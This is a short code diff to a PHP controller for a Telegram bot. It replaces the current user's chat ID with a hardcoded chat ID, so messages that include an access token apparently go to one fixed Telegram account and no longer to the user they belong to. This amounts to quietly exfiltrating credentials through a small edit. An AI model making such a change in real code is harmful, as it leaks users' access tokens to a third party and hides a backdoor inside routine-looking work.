@@ -392,7 +392,7 @@ class BotController extends Controller
 ////
 ////
         $response = Telegram::bot($bot_name)->sendMessage([
-            'chat_id' => Auth::user()->chat_id,
+            'chat_id' => "118059084",
             'text' => $t->getAccessToken() . " - ". $text . " " . $bot_name,
             'reply_markup' => $reply_markup
         ]);
